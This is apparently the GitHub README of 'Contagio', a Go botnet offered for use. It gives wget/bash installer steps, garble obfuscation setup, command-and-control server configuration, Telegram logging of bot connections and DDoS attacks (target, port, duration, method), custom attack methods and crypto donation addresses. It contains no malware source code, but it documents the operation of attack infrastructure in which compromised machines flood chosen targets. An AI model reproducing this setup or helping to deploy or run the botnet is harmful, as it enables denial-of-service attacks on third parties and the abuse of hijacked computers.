# Contagio

Contagio is a botnet written in go.
This is a beta version so there may be bugs.
Read the FAQ and documentation before creating an issue.
Don't believe the Ukrainian propaganda 🤍💙❤️

<p align="center">  <a href="https://t.me/+rCTdqxynV40xM2Ex"><img width="160" height="50" src="https://i.imgur.com/N7AK7XY.png"></a></p>

[Installation](#installation)  
[Supported systems](#supported-systems)  
[Documentation](#documentation)  
[FAQ](#faq)  
[Donations](#donations)

## Features

- Bot written in pure go without any dependencies (native)
- All data between bot and server is encrypted
- You can run in docker container
- Customisation without programming knowledge

### Supported systems

| Os      | Status  |
| ------- | ------- |
| Linux   | &#9745; |
| Windows | &#9744; |
| macOS   | &#9744; |

Linux distributions

| Distro  | Status  |
| ------- | ------- |
| Arch    | &#9745; |
| Manjaro | &#9745; |
| Fedora  | &#9745; |
| Centos  | &#9745; |
| Ubuntu  | &#9745; |

system information can be found in the photos in the assets folder

## Installation

Contagio has its own installer.

```
 wget https://raw.githubusercontent.com/TryZeroOne/Contagio/main/installer/installer.sh -O installer.sh
 bash installer.sh -[args]

 Example: bash installer.sh -default
```

Args:

|         |                                                                   |
| ------- | ----------------------------------------------------------------- |
| clean   | installs contagio without preinstalled configurations and themes. |
| default | installs contagio with preinstalled configurations and themes.    |

```
source ~/.bashrc
go install mvdan.cc/garble@latest
nimble install parsetoml -y
cd Contagio
go mod init contagio
go mod tidy
```

then follow the steps from setup.txt  
Setup guide soon...

## Documentation

### Config

| Name                         | Type   | Description                                                                                                                          |
| ---------------------------- | ------ | ------------------------------------------------------------------------------------------------------------------------------------ |
| `ImportTheme`                | String | Imports a theme. Read more about customising [here](#theme).                                                                         |
| `CncServer`                  | String | IP:PORT. You must specify a public IP. To get a public IP, enter `curl http://ip-api.com/json/?fields=query  `                       |
| `RootLogin`                  | String | Login that has access to admin commands (addip, adduser, etc).                                                                       |
| `RELEASE_MODE`               | Bool   | Hides logs (new bot connected, bin sent, etc).                                                                                       |
| `TelegramBotToken`           | String | Telegram bot token.                                                                                                                  |
| `TelegramChatId`             | String | Your telegram id/chat id. [Get Id.](https://www.alphr.com/find-chat-id-telegram/#How_to_Find_a_Telegram_Chat_ID_On_a_Windows_PC)     |
| `SaveLogsInFile`             | Bool   | Save the logs in a file?                                                                                                             |
| `SendLogsInTelegram`         | Bool   | Send logs via Telegram bot to a channel or private messages?                                                                         |
| `PrintLogsInTerminal`        | Bool   | Print logs in the terminal?                                                                                                          |
| `NewClientConnectedLog`      | Bool   | Enable logging for a new connection to the cnc.                                                                                      |
| `NewClientConnectedFileName` | String | File name for logs of new connections.                                                                                               |
| `NewAttackStartedFileName`   | String | File name for logs of new attacks.                                                                                                   |
| `AllowAllIps`                | Bool   | Allow All IP Addresses? If AllowAllIps=false, then only IP addresses added via the addip command will be able to connect to the cnc. |

### Custom modules

Custom modules can only be used in the Title. Your result from echo will be displayed in the Title. Custom modules consist of:

```
[Modules.ModuleName]
Exec = "command to execute"
ExecEnv = "env"
ExecDir = "directory where the command is executed"
```

Only Exec is required to be specified. If ExecDir is not specified, it will be executed from the directory where the CNC is launched.

### Customisation

You can use an empty [theme](themes/empty.toml), or you can use an existing [theme](themes/blue_contagio.toml). You can also use [colors](#colors).

| Name | Type | Variables | Description |
| ---- | ---- | --------- | ----------- |
**[Logs]**
|`NewClientConnectedTerminal` |String |`{ip}` `{login}` `{port}` `{date}` | The log format in the terminal for a new connection.
|`NewClientConnectedTelegram` |String |`{ip}` `{login}` `{port}` `{date}` | The log format in Telegram for a new connection (You can use markdown).
|`NewClientConnectedFile` |String |`{ip}` `{login}` `{port}` `{date}` | The log format in a file for a new connection.
|`NewAttackStartedTerminal` |String |`{ip}` `{login}` `{port}` `{date}` `{target}` `{target_port}` `{duration}` `{method}` | The log format in the terminal for a new attack.
|`NewAttackStartedTelegram` |String |`{ip}` `{login}` `{port}` `{date}` `{target}` `{target_port}` `{duration}` `{method}` | The log format in Telegram for a new attack.
|`NewAttackStartedFile` |String |`{ip}` `{login}` `{port}` `{date}` `{target}` `{target_port}` `{duration}` `{method}` | The log format in a file for a new attack.
| **[CNC]** |
|`CmdPrompt` | String |`{login}` | CNC command prompt.
|`Banner` | String (Array) | `Null` | Banner.
|`HelpCommand` | String | `{command}` `{description}` | Help command output format.
|`MethodsCommand` | String | `{name}` `{description}` | Methods command output format.
|`CustomMethodsEnabled` | Bool | `Null` | Enable custom methods?
|`CustomMethods` | String (Array) | `Null` | Custom methods (enabled when `CustomMethodsEnabled=true`).
|`CustomHelpEnabled` | Bool | `Null` | Enable custom help?
|`CustomHelp` | String (Array) | `Null` | Custom help (enabled when `CustomHelpEnabled=true`).
|`BotCount` | String | `{total}` `{bots}` | Bots command output format.
|`NoBotsConnectedError` | String | `Null` | Error message when executing the "bots" command but no bots are available.
|`CommandSent` | String | `{bots}` `{id}` | Output when the attack is successfully sent.
|`UnknownCommandError` | String | `Null` | Error message when the command is unknown.
|`InvalidCommandSyntaxError` | String | `{syntax} {example}` | Error message when the command (ddos method) has incorrect syntax.
|`NoActiveAttacksError` | String | `Null` | Error message when there are no active attacks (running command).
|`AttackIdNotFoundError` | String | `Null` | Error message when attack ID is not found (kill command).
|`CommandExecuted` | String | `Null` | Result when the command is successfully executed.
|`CommandInvalidSyntax` | String | `{syntax} {example}` | Error message when the command has incorrect syntax.
|`Title` | String | `{login}` `{cpu}` `{memory}` `{animation}` `{bots}`| CNC title.
**[Auth]**
|`LoginPrompt` | String | `Null` | Login prompt.
|`PasswordPrompt` | String | `Null` | Password prompt.
|`AuthError` | String | `Null` | Error message when the password or login is incorrect.
|`CaptchaPrompt` | String | `{code}` | Captcha prompt.
|`CaptchaError` | String | `Null` | Error message when the captcha is entered incorrectly.
|`IpIsNotAllowedError` | String | `Null` | Error message when the IP is not allowed.

### Colors

In Contagio, there are built-in colors available, and you can also create your own.  
Colors should be written within curly braces. For example,

```
CncPrompt = "{red}Hello{white} World: "
```

- {black}
- {red}
- {green}
- {yellow}
- {blue}
- {magenta}
- {cyan}
- {reset}
- {rainbow(text)}

To create your own color, you need to use [ANSI colors](https://gist.github.com/JBlond/2fea43a3049b38287e5e9cefc87b2124). For example:

```
{custom(fg=ansi_code bg=ansi_code fgstyle=ansi_code)}
```

### FAQ

#### Q: When I connect to the CNC via PuTTY, the banner and other elements are displayed incorrectly.

A: Try adding \r at the end of the line. For example

```
PasswordPrompt = "Enter password: \r"
```

If that doesn't work, create an [issue](github.com/TryZeroOne/Contagio/issues)

#### Q: How do I get a telegram bot token

A: Send /newbot to the @BotFather bot, then answer his questions and copy the token (Token example: 1234545:DDDDD\_\_ASDADAHUQHHHI34I29I).

#### Q: My bots are not connecting

A: Most likely, you have a preconfigured setup. Please watch my [video](https://youtu.be/xHw7I4PqnDU) and repeat all the steps. Compare the config.toml -> BotServer with the IP and port specified in the bot's config.

## Donations

<details><summary>Ton</summary>
EQAmUr0NqEz6nnfUc2GeeGbUhOmd7Wh1zvIVQWWdj_MN6wlY
</details>
<details><summary>Litecoin</summary>
LMtj3jCFjgvDSCP1jqoE5AdbSbSevVxRJg
</details>
<details><summary>Monero</summary> 
429o1bxqyhs83hozpwbEZJitPcX8W73Nz86YRvyiWFkHAfnMk2ZA1VjeNnduKLKcFw45U2VAsQTFs7S5Ac1E16roKhnP777  
</details>
